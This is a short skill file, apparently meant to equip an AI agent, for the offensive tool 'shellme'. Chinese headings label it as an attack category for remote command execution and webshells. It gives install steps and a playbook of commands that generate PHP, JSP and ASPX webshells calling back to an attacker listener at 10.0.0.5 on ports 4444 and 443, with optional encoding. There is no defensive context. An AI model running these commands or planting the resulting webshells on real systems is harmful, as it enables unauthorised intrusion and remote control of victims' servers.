---
name: shellme-webshell
description: "shellme: multilingual WebShell generation. Signals: webshell, rce, JSP, encoding."
zh-signals: "shellme: 多语言 WebShell 生成。信号:webshell,rce,JSP,编码。"
---

# shellme

- 攻击大类:C13 远程命令执行与WebShell
- 上游仓库:https://github.com/hatRiot/shellme
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/hatRiot/shellme
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 shellme.py -l 10.0.0.5 -p 4444 -o shell.php` | WebShell 生成 |
| `-o shell.jsp -p 443` | JSP |
| `-e` | 编码 |

## 攻击场景 Playbook

### 多语言 WebShell 生成

```bash
python3 shellme.py -l 10.0.0.5 -p 4444 -o cmd.aspx
# 选语言+编码
```

## 注意事项

多语言 WebShell 生成器,hatRiot 出品。
